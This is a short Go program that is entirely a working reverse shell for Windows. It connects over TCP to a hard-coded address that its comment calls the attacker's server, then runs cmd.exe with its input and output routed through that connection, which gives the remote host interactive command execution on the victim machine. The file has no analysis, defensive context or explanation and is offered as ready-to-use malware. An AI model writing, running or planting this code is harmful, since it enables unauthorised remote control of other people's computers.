package main

import (
	"net"
	"os/exec"
	"io"
)

func main() {
	// Connect to the attacker's server
	conn, err := net.Dial("tcp", "192.168.88.98:4445")
	if err != nil {
		return
	}
	defer conn.Close()

	// Create a command that runs the shell
	cmd := exec.Command("cmd.exe")

	// Create pipes for stdin, stdout, and stderr
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp

	// Start the command
	go io.Copy(conn, rp)
	cmd.Run()
}
